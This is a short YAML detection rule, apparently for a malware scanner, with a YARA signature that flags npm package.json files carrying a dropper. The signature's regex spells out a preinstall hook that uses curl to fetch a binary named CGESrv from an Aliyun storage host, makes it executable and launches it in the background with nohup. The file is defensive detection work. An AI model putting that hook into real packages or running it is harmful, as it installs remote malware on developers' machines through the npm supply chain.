---
defaults:
  platforms: [linux]
  for: [package.json]
  attack: T1195.002,T1105,T1059.004,T1543.003
traits:
- id: boss-ops-oss-npm-install-dropper
  desc: Downloads and launches boss-ops CGESrv
  crit: hostile
  conf: 0.995
  if:
    type: yara
    source: |
      rule boss_ops_oss_npm_install_dropper {
        strings:
          $s0 = /"preinstall"\s*:\s*"curl\s+-sSL\s+https:\/\/boss-ops\.oss-cn-beijing\.aliyuncs\.com\/CGESrv\s+-o\s+\/tmp\/CGESrv\s*&&\s*chmod\s+777\s+\/tmp\/CGESrv\s*&&\s*nohup\s+\/tmp\/CGESrv\s*&/
        condition:
          ($s0)
      }
composite_rules: []
